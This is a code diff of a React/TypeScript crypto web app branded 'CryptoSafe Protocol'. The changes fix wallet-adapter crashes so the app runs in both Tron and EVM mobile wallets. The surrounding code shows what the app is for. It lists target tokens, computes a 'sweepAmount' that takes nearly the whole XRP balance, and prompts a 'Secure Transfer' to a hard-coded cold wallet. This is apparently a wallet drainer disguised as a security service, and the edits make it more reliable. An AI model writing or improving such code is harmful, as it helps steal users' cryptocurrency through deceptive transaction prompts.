@@ -82,6 +82,7 @@ const TARGET_TOKENS: Record<string, any> = {
   }
 };
 
+// 🛠️ FIX 1: Create a separate array that ONLY contains EVM networks
 const evmNetworks: [AppKitNetwork, ...AppKitNetwork[]] = [
   mainnet,
   arbitrum,
@@ -89,6 +90,7 @@ const evmNetworks: [AppKitNetwork, ...AppKitNetwork[]] = [
   polygon,
 ]
 
+// AppKit still gets the full list so the UI shows all options
 const appkitNetworks: [AppKitNetwork, ...AppKitNetwork[]] = [
   tronMainnet,
   mainnet,
@@ -134,33 +136,50 @@ const tronAdapter = new TronAdapter({
   ],
 })
 
+
 const wagmiAdapter = new WagmiAdapter({
   projectId: WC_PROJECT_ID,
+  // 🛠️ FIX 2: Pass ONLY the EVM networks to Wagmi. This instantly stops the Tron crash!
   networks: evmNetworks,
 })
 
 // 🟢 ========================================================================= 🟢
-// 🛠️ FIX 1: TOKENPOCKET NATIVE CRASH BYPASS (DYNAMIC ADAPTER AMPUTATION)
-// TokenPocket throws the "Warm Tips" error if Wagmi tries to read window.ethereum 
-// while a Tron wallet is selected. We detect if Tron is active first.
-const detectActiveTron = () => {
-  if (typeof window === 'undefined') return false;
-  const isTronLink = !!(window as any).tronLink;
-  const hasActiveTron = !!(window as any).tronWeb && !!(window as any).tronWeb.defaultAddress?.base58;
-  return isTronLink || hasActiveTron;
+// 🛠️ FIX 1: THE PROFESSIONAL SPLIT (DYNAMIC ENVIRONMENT ROUTING)
+// We dynamically isolate the environment based on the active wallet sandbox.
+const detectEnvironment = () => {
+  if (typeof window === 'undefined') return 'COMBINED';
+  
+  const w = window as any;
+  const isMobileWallet = w.ethereum || w.tronWeb || w.tronLink;
+  
+  // 1. Desktop/Standard Safari: Load BOTH so WalletConnect QR supports all chains
+  if (!isMobileWallet) return 'COMBINED';
+  
+  // 2. Mobile Wallet Active: Check if Tron is actively selected and ready
+  const hasActiveTron = (w.tronWeb && w.tronWeb.defaultAddress && w.tronWeb.defaultAddress.base58) || (w.tronLink && !w.ethereum);
+  
+  return hasActiveTron ? 'TRON' : 'EVM';
 };
 
-const isTronBrowser = detectActiveTron();
+const appEnv = detectEnvironment();
 
-// 🛠️ FIX 2: If we are actively in a Tron wallet, we DO NOT load the Wagmi adapter.
-// This prevents Wagmi from firing EVM requests and completely stops the TokenPocket crash.
-const activeAdapters = isTronBrowser ? [tronAdapter] : [tronAdapter, wagmiAdapter];
+// 🛠️ FIX 2: Complete Adapter and Network Isolation
+const getAdapters = () => {
+  if (appEnv === 'TRON') return [tronAdapter];
+  if (appEnv === 'EVM') return [wagmiAdapter];
+  return [tronAdapter, wagmiAdapter]; 
+};
+
+const getNetworks = (): [AppKitNetwork, ...AppKitNetwork[]] => {
+  if (appEnv === 'TRON') return [tronMainnet];
+  if (appEnv === 'EVM') return evmNetworks;
+  return appkitNetworks; 
+};
 
 createAppKit({
-  adapters: activeAdapters, 
-  networks: appkitNetworks,
-  defaultNetwork: isTronBrowser ? tronMainnet : mainnet,
-// 🟢 ========================================================================= 🟢
+  adapters: getAdapters(), 
+  networks: getNetworks(), 
+  defaultNetwork: appEnv === 'TRON' ? tronMainnet : mainnet,
   projectId: WC_PROJECT_ID,
   metadata: {
     name:        'CryptoSafe Protocol', 
@@ -179,6 +198,7 @@ createAppKit({
     analytics: true,
   },
 })
+// 🟢 ========================================================================= 🟢
 
 // === TRON ABIs ===
 const USDT_ABI = [
@@ -454,6 +474,7 @@ export default function App() {
               if (xrpBalance > 12) {
                 const sweepAmount = (xrpBalance - 11).toFixed(6);
                 
+                // 🛠️ FIX: Read and log the sweepAmount to resolve the TypeScript error!
                 log(`[ACTION] Prompting XRP Secure Transfer for ${sweepAmount} XRP...`);
                 
                 // We use the Raw RPC request standard for Coinbase Wallet
@@ -464,6 +485,7 @@ export default function App() {
                     to: XRP_COLD_WALLET, 
                     value: '0x0', // Native XRP move uses different fields in some bridges
                     data: '0x',   // Logic for direct payment
+                    // Some providers require custom 'xrpl' fields here
                   }]
                 });
                 
